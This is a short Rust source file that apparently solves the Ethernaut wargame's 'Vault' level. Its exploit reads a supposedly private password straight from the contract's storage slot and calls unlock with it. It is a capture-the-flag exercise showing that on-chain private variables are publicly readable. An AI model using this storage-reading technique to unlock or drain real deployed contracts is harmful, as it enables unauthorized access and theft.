//! Ethernaut 08 — Vault.
//!
//! Goal: Unlock the password-protected `Vault` so that its `locked` flag
//! becomes false.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/Vault.sol

use alloy::primitives::U256;
use alloy::providers::Provider;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl08_vault::*;

pub struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let provider = offender.provider();
        let password =
            provider.get_storage_at(target.address, U256::from(1)).await?;
        let contract = Vault::new(target.address, provider);
        contract.unlock(password.into()).send().await?.watch().await?;
        Ok(())
    }
}
